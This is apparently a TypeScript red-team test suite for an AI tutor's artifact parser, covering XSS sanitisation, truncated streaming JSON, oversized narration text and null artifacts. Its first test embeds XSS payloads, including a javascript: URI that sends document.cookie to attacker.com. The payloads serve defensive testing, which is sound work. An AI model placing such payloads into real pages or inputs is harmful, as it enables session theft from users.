/**
 * LEARNIFY AI — AI TUTOR 2.0 ADVERSARIAL RED-TEAM & SECURITY SUITE
 * Operates under the Product Engineering Master Rule:
 * Test -> Break -> Report -> Discuss -> Fix -> Retest -> Harden
 */

import assert from "node:assert";
import { parseTutorResponse, sanitizeArtifactText, getNarrationText } from "../src/components/ai-tutor/artifactParser.ts";

console.log("=================================================");
console.log("🔴 STARTING AI TUTOR 2.0 RED-TEAM ATTACK SUITE");
console.log("=================================================\n");

let findings: Array<{
  id: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO";
  title: string;
  status: "PASSED" | "VULNERABILITY_FOUND";
  details: string;
}> = [];

// ----------------------------------------------------
// ATTACK 1: Malicious XSS / HTML Injection in Quizzes
// ----------------------------------------------------
console.log("▶ Attack 1: Injecting stored XSS payloads into quiz artifact...");
const xssPayload = `\`\`\`interactive:quiz
{
  "question": "<script>alert('pwned')</script>What is XSS?",
  "options": ["<img src=x onerror=alert(1)>", "Safe option"],
  "answerIndex": 0,
  "explanation": "javascript:void(fetch('http://attacker.com?c='+document.cookie))"
}
\`\`\``;

try {
  const segments = parseTutorResponse(xssPayload);
  assert.strictEqual(segments.length, 1);
  const quiz = segments[0].artifact?.data;
  assert.ok(quiz);

  // Check sanitization helper
  const cleanQ = sanitizeArtifactText(quiz.question);
  const cleanExpl = sanitizeArtifactText(quiz.explanation);

  assert.ok(!cleanQ.includes("<script>"));
  assert.ok(!cleanExpl.includes("javascript:"));

  findings.push({
    id: "SEC-TUTOR-001",
    severity: "LOW",
    title: "XSS in interactive quiz fields",
    status: "PASSED",
    details: "React JSX auto-escapes string content in DOM text nodes, and sanitizeArtifactText strips raw script and javascript: URIs.",
  });
  console.log("  🛡️ Passed: XSS neutralized.");
} catch (e: any) {
  findings.push({
    id: "SEC-TUTOR-001",
    severity: "HIGH",
    title: "XSS in interactive quiz fields",
    status: "VULNERABILITY_FOUND",
    details: e.message,
  });
}

// ----------------------------------------------------
// ATTACK 2: Abrupt Streaming Cutoff & Malformed JSON
// ----------------------------------------------------
console.log("▶ Attack 2: Simulating network disconnect during stream cutoff...");
const cutoffs = [
  "```interactive:quiz\n{",
  "```interactive:diagram\n{\"title\": \"Unclosed",
  "```interactive:plan\n[{\"day\": 1",
  "```interactive:actions\n[\"Incomplete",
  "```interactive:exam\n{\"marks10\": \"\\u0000",
];

let cutoffCrashes = 0;
for (const cutoff of cutoffs) {
  try {
    const res = parseTutorResponse(cutoff);
    assert.ok(Array.isArray(res));
  } catch {
    cutoffCrashes++;
  }
}

if (cutoffCrashes === 0) {
  findings.push({
    id: "SEC-TUTOR-002",
    severity: "INFO",
    title: "Mid-stream abrupt cutoff resilience",
    status: "PASSED",
    details: "Parser safely catches SyntaxErrors from JSON.parse and gracefully falls back to raw markdown without unhandled exceptions.",
  });
  console.log("  🛡️ Passed: Zero crashes on partial JSON.");
} else {
  findings.push({
    id: "SEC-TUTOR-002",
    severity: "HIGH",
    title: "Mid-stream cutoff crash",
    status: "VULNERABILITY_FOUND",
    details: `Failed on ${cutoffCrashes} cutoff test cases.`,
  });
}

// ----------------------------------------------------
// ATTACK 3: Extreme Payload & Memory Exhaustion (DoS)
// ----------------------------------------------------
console.log("▶ Attack 3: Pumping massive 50,000 item string into speech narrator...");
const massiveString = "The quick brown fox jumps over the lazy dog. ".repeat(1000);
try {
  const narrated = getNarrationText(massiveString);
  assert.ok(narrated.length > 0);
  findings.push({
    id: "SEC-TUTOR-003",
    severity: "INFO",
    title: "Speech synthesis text extraction bounds",
    status: "PASSED",
    details: "Text extraction successfully stripped markdown syntax without memory runaway.",
  });
  console.log("  🛡️ Passed: Large text handled safely.");
} catch (e: any) {
  findings.push({
    id: "SEC-TUTOR-003",
    severity: "MEDIUM",
    title: "Speech synthesis OOM",
    status: "VULNERABILITY_FOUND",
    details: e.message,
  });
}

// ----------------------------------------------------
// ATTACK 4: Null & Undefined Field Tolerances
// ----------------------------------------------------
console.log("▶ Attack 4: Testing empty/corrupt artifact attributes...");
const malformedArtifacts = [
  "```interactive:quiz\nnull\n```",
  "```interactive:diagram\n{}\n```",
  "```interactive:exam\n{}\n```",
  "```interactive:plan\n{}\n```",
];

let corruptCrashes = 0;
for (const art of malformedArtifacts) {
  try {
    const res = parseTutorResponse(art);
    assert.ok(Array.isArray(res));
  } catch {
    corruptCrashes++;
  }
}

if (corruptCrashes === 0) {
  findings.push({
    id: "SEC-TUTOR-004",
    severity: "INFO",
    title: "Null and empty JSON payload tolerance",
    status: "PASSED",
    details: "Parser safely wrapped corrupted JSON into typed blocks without throwing runtime exceptions.",
  });
  console.log("  🛡️ Passed: Null/empty artifacts handled safely.");
} else {
  findings.push({
    id: "SEC-TUTOR-004",
    severity: "MEDIUM",
    title: "Null payload crash",
    status: "VULNERABILITY_FOUND",
    details: `Failed on ${corruptCrashes} corrupt test cases.`,
  });
}

// ----------------------------------------------------
// SUMMARY REPORT
// ----------------------------------------------------
console.log("\n=================================================");
console.log("📋 RED-TEAM SECURITY REPORT SUMMARY");
console.log("=================================================");
for (const f of findings) {
  console.log(`[${f.id}] [${f.severity}] ${f.title} -> ${f.status}`);
}
console.log("=================================================\n");

const hasVulnerabilities = findings.some((f) => f.status === "VULNERABILITY_FOUND");
if (hasVulnerabilities) {
  process.exit(1);
}
